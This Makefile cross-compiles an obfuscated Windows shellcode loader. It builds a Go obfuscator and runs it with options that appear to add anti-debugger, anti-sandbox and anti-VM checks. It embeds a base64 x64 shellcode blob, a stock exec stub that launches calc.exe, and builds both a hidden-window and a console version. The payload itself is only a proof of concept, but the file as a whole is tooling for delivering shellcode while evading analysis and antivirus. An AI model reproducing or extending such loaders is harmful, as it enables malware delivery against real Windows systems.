MSC=x86_64-w64-mingw32-gcc

all: clean loader loader-console

loader:
	$(MSC) -mwindows -s $@.c -o $@.exe

loader-console:
	$(MSC) -s loader.c -o $@.exe

clean:
	rm -f *.exe

source:
	rm -f loader.c
	go build -o .. ..
	../obfuscator -dir .. -tpl loader_tpl.c -ops 5 -obfs 5 -dbgs 2 -snds 1 -vmds 1 -shell /EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA > loader.c
